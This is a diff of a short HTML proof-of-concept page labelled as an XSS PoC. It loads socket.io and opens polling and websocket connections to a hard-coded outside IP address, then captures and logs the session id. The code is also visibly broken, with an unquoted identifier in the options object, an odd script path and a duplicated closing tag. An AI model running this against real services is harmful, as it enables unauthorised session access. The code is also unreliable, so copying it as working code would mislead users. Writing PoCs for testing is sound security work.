@@ -3,12 +3,18 @@
 <h1>
     POC for xss.Created by johnstone.
 </h1>
-<script src="/js/socket.io.js"></script>
+<script src="/burp1.com/js/socket.io.js"></script>
 <script>
-  const socket = io("https://154.43.165.231:8800/ws/?EIO=3&transport=polling&t=O0zFLMO", { transports: ["polling"] });
+  const socket = io("https://154.43.165.231:8800/ws/", { EIO:3,transports: ["polling"],t:O0zFLMO});
   socket.on("connect", () => {
-  console.log(socket.io.engine.id); // prints something like "l9IoONULqVPQYa0DAAAA"
-});
+      console.log(socket.io.engine.id); // prints something like "l9IoONULqVPQYa0DAAAA"
+      const sessionId = socket.io.engine.id
+  });
+    
+  const websocket = io("https://154.43.165.231:8800/ws/", { EIO:3,transports: ["websocket"],t:O0zFLMO});
+  websocket.on("connect", () => {
+    console.log(websocket.connected); // true
+  });
 </script>
 </script>
 </body>
